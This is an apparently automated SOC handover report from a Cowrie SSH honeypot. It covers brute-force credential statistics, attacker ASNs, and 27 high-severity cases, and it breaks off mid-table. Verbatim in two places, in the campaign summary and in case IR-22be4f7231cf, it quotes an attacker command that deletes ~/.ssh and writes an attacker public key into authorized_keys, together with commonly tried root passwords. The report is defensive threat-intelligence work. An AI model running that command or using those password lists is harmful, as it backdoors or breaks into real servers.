# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-03-28 |
| **Generated At** | 2026-03-28T12:51:33Z |
| **Shift Time** | 12:51 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **100** |
| Confirmed Threats | **94** |
| False Positives Filtered | **6** (6.0%) |
| Unique Attacker IPs | **41** |
| Countries of Origin | **21** |
| High Severity Cases | **27** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **73** |
| Malware Samples Analyzed | **0** HIGH · **6** MED · 1 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **90** |
| Unique Credential Pairs | **85** |
| Unique Usernames | **45** |
| Unique Passwords | **72** |
| Successful Auth Pairs | **27** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 27 |
| `user` | 4 |
| `oracle` | 3 |
| `admin` | 3 |
| `Centos` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456` | 11 |
| `abc123` | 2 |
| `11111` | 2 |
| `administrator` | 2 |
| `345gs5662d34` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `11111` | 2 |
| `345gs5662d34` | `345gs5662d34` | 2 |
| `root` | `3245gs5662d34` | 2 |
| `root` | `asdf1234` | 2 |
| `root` | `root10` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `!Q2w3e4r` | `112.78.3.139` | 2026-03-28T10:35:50 |
| `root` | `aA123456` | `112.78.3.139` | 2026-03-28T10:36:19 |
| `root` | `P@ssw0rd` | `112.78.3.139` | 2026-03-28T10:36:30 |
| `root` | `!qaz@WSX` | `112.78.3.139` | 2026-03-28T10:36:33 |
| `root` | `Aa123456` | `112.78.3.139` | 2026-03-28T10:36:53 |
| `root` | `abc123` | `112.78.3.139` | 2026-03-28T10:36:58 |
| `root` | `p@ssword` | `112.78.3.139` | 2026-03-28T10:37:03 |
| `root` | `Ab123456` | `112.78.3.139` | 2026-03-28T10:37:07 |
| `root` | `1qaz@wsx` | `112.78.3.139` | 2026-03-28T10:37:12 |
| `root` | `P@ssword` | `112.78.3.139` | 2026-03-28T10:37:14 |
| `root` | `qQ123456` | `112.78.3.139` | 2026-03-28T10:37:20 |
| `root` | `password` | `112.78.3.139` | 2026-03-28T10:37:26 |
| `root` | `Pa$$w0rd` | `112.78.3.139` | 2026-03-28T10:37:34 |
| `root` | `admin` | `112.78.3.139` | 2026-03-28T10:38:07 |
| `root` | `1` | `112.78.3.139` | 2026-03-28T10:38:15 |
| `root` | `qwerty123` | `112.78.3.139` | 2026-03-28T10:38:20 |
| `root` | `1Q2w3e4r` | `112.78.3.139` | 2026-03-28T10:38:31 |
| `root` | `11111` | `111.70.32.50` | 2026-03-28T10:40:12 |
| `root` | `11111` | `34.41.211.48` | 2026-03-28T10:40:20 |
| `root` | `stephen` | `122.166.49.42` | 2026-03-28T10:54:36 |
| `root` | `3245gs5662d34` | `122.166.49.42` | 2026-03-28T10:54:37 |
| `root` | `0p9o8i` | `135.237.122.43` | 2026-03-28T10:59:36 |
| `root` | `3245gs5662d34` | `135.237.122.43` | 2026-03-28T10:59:41 |
| `root` | `asdf1234` | `220.132.170.64` | 2026-03-28T11:20:12 |
| `root` | `asdf1234` | `163.176.167.78` | 2026-03-28T11:20:22 |
| `root` | `root10` | `218.26.205.154` | 2026-03-28T12:40:47 |
| `root` | `root10` | `196.189.126.10` | 2026-03-28T12:40:56 |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `135.237.122.43`, `122.166.49.42`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **41** |
| Unique ASNs | **32** |
| High-Risk ASNs | **29** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4837` | CHINA UNICOM China169 Backbone | 3 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS4766` | Korea Telecom | 2 | HIGH |
| `AS9829` | National Internet Backbone | 2 | HIGH |
| `AS203214` | Hulum Almustakbal Company for Communication Engineering and Services Ltd | 2 | HIGH |
| `AS3462` | Data Communication Business Group | 2 | HIGH |
| `AS8473` | Bahnhof AB | 2 | HIGH |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (27)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-2913f0339870

| Field | Detail |
|---|---|
| **Source IP** | `112.78.3[.]139` |
| **First Seen** | 2026-03-28 10:35 |
| **Last Seen** | 2026-03-28 10:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 10:35:49` | `cowrie.session.connect` |
| `2026-03-28 10:35:49` | `cowrie.client.version` |
| `2026-03-28 10:35:49` | `cowrie.client.kex` |
| `2026-03-28 10:35:50` | `cowrie.login.success` |
| `2026-03-28 10:35:51` | `cowrie.session.params` |
| `2026-03-28 10:35:51` | `cowrie.command.input` |
| `2026-03-28 10:35:51` | `cowrie.log.closed` |
| `2026-03-28 10:35:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.78.3[.]139` to AbuseIPDB if not already reported
- [ ] Block `112.78.3[.]139` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f5d4139c949c

| Field | Detail |
|---|---|
| **Source IP** | `112.78.3[.]139` |
| **First Seen** | 2026-03-28 10:36 |
| **Last Seen** | 2026-03-28 10:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 10:36:18` | `cowrie.session.connect` |
| `2026-03-28 10:36:18` | `cowrie.client.version` |
| `2026-03-28 10:36:18` | `cowrie.client.kex` |
| `2026-03-28 10:36:19` | `cowrie.login.success` |
| `2026-03-28 10:36:19` | `cowrie.session.params` |
| `2026-03-28 10:36:19` | `cowrie.command.input` |
| `2026-03-28 10:36:19` | `cowrie.log.closed` |
| `2026-03-28 10:36:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.78.3[.]139` to AbuseIPDB if not already reported
- [ ] Block `112.78.3[.]139` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d43f31c5f44

| Field | Detail |
|---|---|
| **Source IP** | `112.78.3[.]139` |
| **First Seen** | 2026-03-28 10:36 |
| **Last Seen** | 2026-03-28 10:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 10:36:29` | `cowrie.session.connect` |
| `2026-03-28 10:36:29` | `cowrie.client.version` |
| `2026-03-28 10:36:29` | `cowrie.client.kex` |
| `2026-03-28 10:36:30` | `cowrie.login.success` |
| `2026-03-28 10:36:30` | `cowrie.session.params` |
| `2026-03-28 10:36:30` | `cowrie.command.input` |
| `2026-03-28 10:36:30` | `cowrie.log.closed` |
| `2026-03-28 10:36:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.78.3[.]139` to AbuseIPDB if not already reported
- [ ] Block `112.78.3[.]139` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17cdf3c7a39b

| Field | Detail |
|---|---|
| **Source IP** | `112.78.3[.]139` |
| **First Seen** | 2026-03-28 10:36 |
| **Last Seen** | 2026-03-28 10:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 10:36:32` | `cowrie.session.connect` |
| `2026-03-28 10:36:32` | `cowrie.client.version` |
| `2026-03-28 10:36:32` | `cowrie.client.kex` |
| `2026-03-28 10:36:33` | `cowrie.login.success` |
| `2026-03-28 10:36:33` | `cowrie.session.params` |
| `2026-03-28 10:36:33` | `cowrie.command.input` |
| `2026-03-28 10:36:33` | `cowrie.log.closed` |
| `2026-03-28 10:36:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.78.3[.]139` to AbuseIPDB if not already reported
- [ ] Block `112.78.3[.]139` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bcf83fb167e5

| Field | Detail |
|---|---|
| **Source IP** | `112.78.3[.]139` |
| **First Seen** | 2026-03-28 10:36 |
| **Last Seen** | 2026-03-28 10:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 10:36:52` | `cowrie.session.connect` |
| `2026-03-28 10:36:52` | `cowrie.client.version` |
| `2026-03-28 10:36:52` | `cowrie.client.kex` |
| `2026-03-28 10:36:53` | `cowrie.login.success` |
| `2026-03-28 10:36:53` | `cowrie.session.params` |
| `2026-03-28 10:36:53` | `cowrie.command.input` |
| `2026-03-28 10:36:53` | `cowrie.log.closed` |
| `2026-03-28 10:36:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.78.3[.]139` to AbuseIPDB if not already reported
- [ ] Block `112.78.3[.]139` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d3ff6139850

| Field | Detail |
|---|---|
| **Source IP** | `112.78.3[.]139` |
| **First Seen** | 2026-03-28 10:36 |
| **Last Seen** | 2026-03-28 10:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 10:36:57` | `cowrie.session.connect` |
| `2026-03-28 10:36:57` | `cowrie.client.version` |
| `2026-03-28 10:36:57` | `cowrie.client.kex` |
| `2026-03-28 10:36:58` | `cowrie.login.success` |
| `2026-03-28 10:36:58` | `cowrie.session.params` |
| `2026-03-28 10:36:58` | `cowrie.command.input` |
| `2026-03-28 10:36:58` | `cowrie.log.closed` |
| `2026-03-28 10:36:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.78.3[.]139` to AbuseIPDB if not already reported
- [ ] Block `112.78.3[.]139` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f9c2df3fd9c

| Field | Detail |
|---|---|
| **Source IP** | `112.78.3[.]139` |
| **First Seen** | 2026-03-28 10:37 |
| **Last Seen** | 2026-03-28 10:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 10:37:02` | `cowrie.session.connect` |
| `2026-03-28 10:37:02` | `cowrie.client.version` |
| `2026-03-28 10:37:02` | `cowrie.client.kex` |
| `2026-03-28 10:37:03` | `cowrie.login.success` |
| `2026-03-28 10:37:03` | `cowrie.session.params` |
| `2026-03-28 10:37:03` | `cowrie.command.input` |
| `2026-03-28 10:37:03` | `cowrie.log.closed` |
| `2026-03-28 10:37:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.78.3[.]139` to AbuseIPDB if not already reported
- [ ] Block `112.78.3[.]139` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c80365f14e80

| Field | Detail |
|---|---|
| **Source IP** | `112.78.3[.]139` |
| **First Seen** | 2026-03-28 10:37 |
| **Last Seen** | 2026-03-28 10:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 10:37:07` | `cowrie.session.connect` |
| `2026-03-28 10:37:07` | `cowrie.client.version` |
| `2026-03-28 10:37:07` | `cowrie.client.kex` |
| `2026-03-28 10:37:07` | `cowrie.login.success` |
| `2026-03-28 10:37:07` | `cowrie.session.params` |
| `2026-03-28 10:37:07` | `cowrie.command.input` |
| `2026-03-28 10:37:07` | `cowrie.log.closed` |
| `2026-03-28 10:37:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.78.3[.]139` to AbuseIPDB if not already reported
- [ ] Block `112.78.3[.]139` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7518e82de83b

| Field | Detail |
|---|---|
| **Source IP** | `112.78.3[.]139` |
| **First Seen** | 2026-03-28 10:37 |
| **Last Seen** | 2026-03-28 10:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 10:37:11` | `cowrie.session.connect` |
| `2026-03-28 10:37:11` | `cowrie.client.version` |
| `2026-03-28 10:37:12` | `cowrie.client.kex` |
| `2026-03-28 10:37:12` | `cowrie.login.success` |
| `2026-03-28 10:37:12` | `cowrie.session.params` |
| `2026-03-28 10:37:12` | `cowrie.command.input` |
| `2026-03-28 10:37:12` | `cowrie.log.closed` |
| `2026-03-28 10:37:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.78.3[.]139` to AbuseIPDB if not already reported
- [ ] Block `112.78.3[.]139` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-278e15644df5

| Field | Detail |
|---|---|
| **Source IP** | `112.78.3[.]139` |
| **First Seen** | 2026-03-28 10:37 |
| **Last Seen** | 2026-03-28 10:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 10:37:14` | `cowrie.session.connect` |
| `2026-03-28 10:37:14` | `cowrie.client.version` |
| `2026-03-28 10:37:14` | `cowrie.client.kex` |
| `2026-03-28 10:37:14` | `cowrie.login.success` |
| `2026-03-28 10:37:15` | `cowrie.session.params` |
| `2026-03-28 10:37:15` | `cowrie.command.input` |
| `2026-03-28 10:37:15` | `cowrie.log.closed` |
| `2026-03-28 10:37:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.78.3[.]139` to AbuseIPDB if not already reported
- [ ] Block `112.78.3[.]139` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89ac23499897

| Field | Detail |
|---|---|
| **Source IP** | `112.78.3[.]139` |
| **First Seen** | 2026-03-28 10:37 |
| **Last Seen** | 2026-03-28 10:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 10:37:19` | `cowrie.session.connect` |
| `2026-03-28 10:37:19` | `cowrie.client.version` |
| `2026-03-28 10:37:19` | `cowrie.client.kex` |
| `2026-03-28 10:37:20` | `cowrie.login.success` |
| `2026-03-28 10:37:20` | `cowrie.session.params` |
| `2026-03-28 10:37:20` | `cowrie.command.input` |
| `2026-03-28 10:37:20` | `cowrie.log.closed` |
| `2026-03-28 10:37:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.78.3[.]139` to AbuseIPDB if not already reported
- [ ] Block `112.78.3[.]139` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-327b69bf458c

| Field | Detail |
|---|---|
| **Source IP** | `112.78.3[.]139` |
| **First Seen** | 2026-03-28 10:37 |
| **Last Seen** | 2026-03-28 10:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 10:37:26` | `cowrie.session.connect` |
| `2026-03-28 10:37:26` | `cowrie.client.version` |
| `2026-03-28 10:37:26` | `cowrie.client.kex` |
| `2026-03-28 10:37:26` | `cowrie.login.success` |
| `2026-03-28 10:37:27` | `cowrie.session.params` |
| `2026-03-28 10:37:27` | `cowrie.command.input` |
| `2026-03-28 10:37:27` | `cowrie.log.closed` |
| `2026-03-28 10:37:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.78.3[.]139` to AbuseIPDB if not already reported
- [ ] Block `112.78.3[.]139` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09b962325ff0

| Field | Detail |
|---|---|
| **Source IP** | `112.78.3[.]139` |
| **First Seen** | 2026-03-28 10:37 |
| **Last Seen** | 2026-03-28 10:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 10:37:33` | `cowrie.session.connect` |
| `2026-03-28 10:37:33` | `cowrie.client.version` |
| `2026-03-28 10:37:33` | `cowrie.client.kex` |
| `2026-03-28 10:37:34` | `cowrie.login.success` |
| `2026-03-28 10:37:34` | `cowrie.session.params` |
| `2026-03-28 10:37:34` | `cowrie.command.input` |
| `2026-03-28 10:37:34` | `cowrie.log.closed` |
| `2026-03-28 10:37:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.78.3[.]139` to AbuseIPDB if not already reported
- [ ] Block `112.78.3[.]139` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1527dc64ceba

| Field | Detail |
|---|---|
| **Source IP** | `112.78.3[.]139` |
| **First Seen** | 2026-03-28 10:38 |
| **Last Seen** | 2026-03-28 10:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 10:38:07` | `cowrie.session.connect` |
| `2026-03-28 10:38:07` | `cowrie.client.version` |
| `2026-03-28 10:38:07` | `cowrie.client.kex` |
| `2026-03-28 10:38:07` | `cowrie.login.success` |
| `2026-03-28 10:38:08` | `cowrie.session.params` |
| `2026-03-28 10:38:08` | `cowrie.command.input` |
| `2026-03-28 10:38:08` | `cowrie.log.closed` |
| `2026-03-28 10:38:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.78.3[.]139` to AbuseIPDB if not already reported
- [ ] Block `112.78.3[.]139` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6e59055d846

| Field | Detail |
|---|---|
| **Source IP** | `112.78.3[.]139` |
| **First Seen** | 2026-03-28 10:38 |
| **Last Seen** | 2026-03-28 10:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 10:38:14` | `cowrie.session.connect` |
| `2026-03-28 10:38:14` | `cowrie.client.version` |
| `2026-03-28 10:38:15` | `cowrie.client.kex` |
| `2026-03-28 10:38:15` | `cowrie.login.success` |
| `2026-03-28 10:38:15` | `cowrie.session.params` |
| `2026-03-28 10:38:15` | `cowrie.command.input` |
| `2026-03-28 10:38:15` | `cowrie.log.closed` |
| `2026-03-28 10:38:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.78.3[.]139` to AbuseIPDB if not already reported
- [ ] Block `112.78.3[.]139` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d183826dc87b

| Field | Detail |
|---|---|
| **Source IP** | `112.78.3[.]139` |
| **First Seen** | 2026-03-28 10:38 |
| **Last Seen** | 2026-03-28 10:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 10:38:20` | `cowrie.session.connect` |
| `2026-03-28 10:38:20` | `cowrie.client.version` |
| `2026-03-28 10:38:20` | `cowrie.client.kex` |
| `2026-03-28 10:38:20` | `cowrie.login.success` |
| `2026-03-28 10:38:20` | `cowrie.session.params` |
| `2026-03-28 10:38:20` | `cowrie.command.input` |
| `2026-03-28 10:38:20` | `cowrie.log.closed` |
| `2026-03-28 10:38:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.78.3[.]139` to AbuseIPDB if not already reported
- [ ] Block `112.78.3[.]139` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-805ac5246395

| Field | Detail |
|---|---|
| **Source IP** | `112.78.3[.]139` |
| **First Seen** | 2026-03-28 10:38 |
| **Last Seen** | 2026-03-28 10:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 10:38:30` | `cowrie.session.connect` |
| `2026-03-28 10:38:30` | `cowrie.client.version` |
| `2026-03-28 10:38:30` | `cowrie.client.kex` |
| `2026-03-28 10:38:31` | `cowrie.login.success` |
| `2026-03-28 10:38:31` | `cowrie.session.params` |
| `2026-03-28 10:38:31` | `cowrie.command.input` |
| `2026-03-28 10:38:31` | `cowrie.log.closed` |
| `2026-03-28 10:38:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.78.3[.]139` to AbuseIPDB if not already reported
- [ ] Block `112.78.3[.]139` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a28efd3c1d7

| Field | Detail |
|---|---|
| **Source IP** | `111.70.32[.]50` |
| **First Seen** | 2026-03-28 10:40 |
| **Last Seen** | 2026-03-28 10:40 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 10:40:10` | `cowrie.session.connect` |
| `2026-03-28 10:40:10` | `cowrie.client.version` |
| `2026-03-28 10:40:10` | `cowrie.client.kex` |
| `2026-03-28 10:40:12` | `cowrie.login.success` |
| `2026-03-28 10:40:13` | `cowrie.direct-tcpip.request` |
| `2026-03-28 10:40:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.32[.]50` to AbuseIPDB if not already reported
- [ ] Block `111.70.32[.]50` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1473f768c360

| Field | Detail |
|---|---|
| **Source IP** | `34.41.211[.]48` |
| **First Seen** | 2026-03-28 10:40 |
| **Last Seen** | 2026-03-28 10:40 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 10:40:18` | `cowrie.session.connect` |
| `2026-03-28 10:40:19` | `cowrie.client.version` |
| `2026-03-28 10:40:19` | `cowrie.client.kex` |
| `2026-03-28 10:40:20` | `cowrie.login.success` |
| `2026-03-28 10:40:21` | `cowrie.direct-tcpip.request` |
| `2026-03-28 10:40:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.41.211[.]48` to AbuseIPDB if not already reported
- [ ] Block `34.41.211[.]48` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-22be4f7231cf

| Field | Detail |
|---|---|
| **Source IP** | `122.166.49[.]42` |
| **First Seen** | 2026-03-28 10:54 |
| **Last Seen** | 2026-03-28 10:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
